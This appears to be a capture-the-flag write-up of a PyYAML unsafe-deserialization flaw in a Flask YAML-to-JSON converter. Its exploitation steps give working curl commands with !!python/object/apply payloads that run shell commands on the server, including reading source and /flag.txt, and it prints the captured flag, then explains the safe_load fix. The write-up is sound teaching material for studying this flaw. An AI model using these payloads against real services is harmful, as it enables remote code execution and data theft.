# Monkey — Web Security CTF Writeup

**Category:** Web Security
**Difficulty:** Medium
**Target:** `ctf-akshay-monkey-096fe763.challenges.pentestgarage.com`

## Summary

The `Monkey` challenge exposes a "YAML to JSON" converter. The backend uses
PyYAML's unsafe `yaml.load()` (with `Loader=yaml.Loader`) instead of
`yaml.safe_load()`, allowing arbitrary Python object deserialization and
remote code execution (RCE) via YAML tags.

## Recon

1. Loaded the home page (`/`) and found a form posting to `/convert` with a
   single `data` field, described as "YAML to JSON".
2. Sent a valid YAML payload to confirm normal behavior:
   ```
   curl -s <target>/convert -d "data=key: value"
   ```
   Returned `{"key": "value"}` — confirmed the endpoint works as advertised.
3. Sent malformed YAML to trigger an error and fingerprint the stack:
   ```
   curl -s <target>/convert -d "data=: : :"
   ```
   Returned a generic Flask/Werkzeug `500 Internal Server Error` page,
   confirming a Python + Flask backend (debug mode off, no traceback leak).

## Vulnerability

PyYAML's default `Loader` (`yaml.Loader`, distinct from `SafeLoader`)
supports the `!!python/object/apply` tag, which can instantiate and call
arbitrary Python callables during deserialization. Since the app used:

```python
serielized_data = yaml.load(data, Loader=yaml.Loader)
```

this directly enables RCE via crafted YAML input.

## Exploitation Steps

**1. Confirm code execution** with a harmless call:

```bash
curl -s <target>/convert \
  --data-urlencode 'data=!!python/object/apply:os.getcwd []'
```

Result: `"/usr/src/app"` — confirmed arbitrary Python object
instantiation/execution.

**2. Enumerate the filesystem:**

```bash
curl -s <target>/convert \
  --data-urlencode 'data=!!python/object/apply:os.listdir ["/usr/src/app"]'
```

Result: `["__pycache__", "static", "templates", "app.py", "requirements.txt"]`

**3. Read source code** (`subprocess.check_output` failed here — it returns
`bytes`, which isn't JSON-serializable and crashed the app with a 500. Used
`subprocess.getoutput`, which returns a plain `str`, instead):

```bash
curl -s <target>/convert \
  --data-urlencode 'data=!!python/object/apply:subprocess.getoutput ["cat /usr/src/app/app.py"]'
```

This confirmed the vulnerable line:
```python
serielized_data = yaml.load(data, Loader=yaml.Loader)
```

**4. Locate the flag file:**

```bash
curl -s <target>/convert \
  --data-urlencode 'data=!!python/object/apply:subprocess.getoutput ["find / -iname *flag* 2>/dev/null"]'
```

Result included: `/flag.txt`

**5. Read the flag:**

```bash
curl -s <target>/convert \
  --data-urlencode 'data=!!python/object/apply:subprocess.getoutput ["cat /flag.txt"]'
```

## Flag

```
ctf{moufee8vae6Ooj7eengohtohVuu5aida}
```

## Root Cause & Fix

- **Root cause:** Use of `yaml.load()` with the unsafe `yaml.Loader` on
  untrusted user input, allowing arbitrary Python object construction and
  method invocation.
- **Fix:** Use `yaml.safe_load()` (or `SafeLoader`) whenever parsing
  untrusted YAML input. `safe_load` restricts deserialization to simple,
  known-safe Python types (str, int, list, dict, etc.) and disallows
  arbitrary object/tag construction.

```python
# Vulnerable
serielized_data = yaml.load(data, Loader=yaml.Loader)

# Fixed
serielized_data = yaml.safe_load(data)
```
